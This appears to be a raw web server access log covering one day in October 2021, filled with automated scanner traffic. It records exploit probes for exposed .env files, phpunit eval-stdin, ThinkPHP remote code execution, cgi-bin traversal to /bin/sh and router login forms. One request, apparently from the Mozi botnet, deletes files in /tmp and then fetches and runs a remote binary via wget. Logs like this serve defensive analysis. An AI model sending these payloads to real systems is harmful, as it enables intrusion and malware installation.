193.142.146.242 - - [27/Oct/2021:06:26:08 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
135.125.217.54 - - [27/Oct/2021:06:27:17 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:06:27:17 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.120.103 - - [27/Oct/2021:06:33:42 +0000] "GET / HTTP/1.1" 200 3488 "-" "Linux Gnu (cow)"
45.146.164.110 - - [27/Oct/2021:06:34:08 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:08 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:09 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:09 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:09 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 200 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:09 +0000] "GET / HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:10 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:10 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:11 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:11 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:11 +0000] "GET /console/ HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:11 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [27/Oct/2021:06:34:11 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.86.35.27 - - [27/Oct/2021:06:34:36 +0000] "\x16\x03\x01" 400 0 "-" "-"
37.19.72.139 - - [27/Oct/2021:06:40:47 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
87.251.64.90 - - [27/Oct/2021:06:58:43 +0000] "\x03" 400 0 "-" "-"
135.125.217.54 - - [27/Oct/2021:07:27:26 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:07:27:26 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.189.13.26 - - [27/Oct/2021:07:34:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://159.89.39.115:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
189.147.234.219 - - [27/Oct/2021:07:47:14 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
40.122.167.171 - - [27/Oct/2021:07:57:13 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
40.122.167.171 - - [27/Oct/2021:07:57:13 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
103.124.12.22 - - [27/Oct/2021:08:18:15 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:08:27:20 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:08:27:20 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.131.24 - - [27/Oct/2021:08:35:32 +0000] "ABCDEFGHIJKLMNOPQRSTUVWXYZ9999" 400 0 "-" "-"
219.69.110.206 - - [27/Oct/2021:09:16:34 +0000] "GET /index.php?s=/index/ hink" 400 0 "-" "-"
135.125.217.54 - - [27/Oct/2021:09:27:13 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:09:27:13 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.56.209 - - [27/Oct/2021:09:31:11 +0000] "GET / HTTP/1.1" 200 3488 "-" "Linux Gnu (cow)"
114.33.64.24 - - [27/Oct/2021:09:48:51 +0000] "GET /index.php?s=/index/ hink" 400 0 "-" "-"
195.78.54.191 - - [27/Oct/2021:09:49:04 +0000] "GET / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
209.141.51.171 - - [27/Oct/2021:09:59:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://159.89.39.115:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
135.125.217.54 - - [27/Oct/2021:10:27:17 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:10:27:17 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.58.153.212 - - [27/Oct/2021:10:27:28 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.58.153.212 - - [27/Oct/2021:10:27:28 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.58.153.212 - - [27/Oct/2021:10:27:29 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
45.87.214.116 - - [27/Oct/2021:10:53:58 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.87.214.116 - - [27/Oct/2021:10:53:58 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.62.185 - - [27/Oct/2021:11:09:50 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
71.6.232.4 - - [27/Oct/2021:11:13:48 +0000] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:11:27:24 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:11:27:24 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
87.251.64.90 - - [27/Oct/2021:11:30:23 +0000] "\x03" 400 0 "-" "-"
120.85.113.133 - - [27/Oct/2021:12:04:50 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 200 256 "-" "Hello, world"
40.122.167.171 - - [27/Oct/2021:12:20:18 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.122.167.171 - - [27/Oct/2021:12:20:18 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:12:27:18 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:12:27:18 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.223.11.71 - - [27/Oct/2021:12:28:59 +0000] "GET /ab2g HTTP/1.1" 400 0 "-" "-"
159.223.11.71 - - [27/Oct/2021:12:28:59 +0000] "GET /ab2h HTTP/1.1" 400 0 "-" "-"
135.125.217.54 - - [27/Oct/2021:13:27:22 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:13:27:22 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.115.28.232 - - [27/Oct/2021:13:49:48 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.115.28.232 - - [27/Oct/2021:13:49:48 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
36.72.219.78 - - [27/Oct/2021:14:19:46 +0000] "GET / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:14:27:24 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:14:27:24 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.208.43 - - [27/Oct/2021:14:34:06 +0000] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 zgrab/0.x"
185.243.68.9 - - [27/Oct/2021:14:34:16 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.243.68.9 - - [27/Oct/2021:14:34:16 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.62.185 - - [27/Oct/2021:15:05:18 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
135.125.217.54 - - [27/Oct/2021:15:27:27 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:15:27:27 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
164.52.24.179 - - [27/Oct/2021:15:28:09 +0000] "\x16\x03\x01\x01 \x01" 400 0 "-" "-"
164.52.24.179 - - [27/Oct/2021:15:28:09 +0000] "\x16\x03\x01" 400 0 "-" "-"
164.52.24.179 - - [27/Oct/2021:15:28:10 +0000] "\x16\x03\x01" 400 0 "-" "-"
164.52.24.179 - - [27/Oct/2021:15:28:10 +0000] "\x16\x03\x01" 400 0 "-" "-"
164.52.24.179 - - [27/Oct/2021:15:28:10 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
20.115.28.232 - - [27/Oct/2021:16:06:31 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.115.28.232 - - [27/Oct/2021:16:06:31 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
45.89.181.171 - - [27/Oct/2021:16:20:16 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.89.181.171 - - [27/Oct/2021:16:20:16 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:16:27:20 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:16:27:20 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.129.64.188 - - [27/Oct/2021:16:31:50 +0000] "GET / HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
185.220.101.7 - - [27/Oct/2021:16:31:51 +0000] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
40.122.167.171 - - [27/Oct/2021:16:54:27 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
178.62.59.163 - - [27/Oct/2021:17:07:48 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.62.59.163 - - [27/Oct/2021:17:07:48 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.195.139.138 - - [27/Oct/2021:17:09:57 +0000] "GET / HTTP/1.1" 200 3469 "-" "Mozilla/5.0 zgrab/0.x"
135.125.217.54 - - [27/Oct/2021:17:27:25 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:17:27:25 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.120.103 - - [27/Oct/2021:17:36:44 +0000] "GET / HTTP/1.1" 200 3488 "-" "Linux Gnu (cow)"
135.125.217.54 - - [27/Oct/2021:18:27:15 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:18:27:15 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.198.30.147 - - [27/Oct/2021:18:32:40 +0000] "GET /ab2g HTTP/1.1" 400 0 "-" "-"
143.198.30.147 - - [27/Oct/2021:18:32:40 +0000] "GET /ab2h HTTP/1.1" 400 0 "-" "-"
67.211.81.8 - - [27/Oct/2021:18:44:56 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:19:27:16 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:19:27:16 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.51.171 - - [27/Oct/2021:19:34:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 492 "http://159.89.39.115:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.56.209 - - [27/Oct/2021:20:15:35 +0000] "GET / HTTP/1.1" 200 3488 "-" "Linux Gnu (cow)"
178.62.59.163 - - [27/Oct/2021:20:19:35 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.62.59.163 - - [27/Oct/2021:20:19:36 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:20:27:18 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:20:27:18 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /api/v1/pods HTTP/1.1" 404 455 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET / HTTP/1.1" 200 3488 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /.git/config HTTP/1.1" 404 455 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /v2/_catalog HTTP/1.1" 404 455 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /.env HTTP/1.1" 200 219 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /info HTTP/1.1" 404 455 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /graphql HTTP/1.1" 404 455 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /metrics HTTP/1.1" 404 455 "-" "Go-http-client/1.1"
209.127.17.242 - - [27/Oct/2021:21:13:08 +0000] "GET /sidekiq HTTP/1.1" 404 455 "-" "Go-http-client/1.1"
135.125.217.54 - - [27/Oct/2021:21:27:24 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:21:27:24 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.44.172 - - [27/Oct/2021:21:48:21 +0000] "GET / HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
66.240.205.34 - - [27/Oct/2021:22:24:51 +0000] "Gh0st\xad" 400 0 "-" "-"
135.125.217.54 - - [27/Oct/2021:22:27:15 +0000] "POST / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [27/Oct/2021:22:27:15 +0000] "GET /.env HTTP/1.1" 200 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
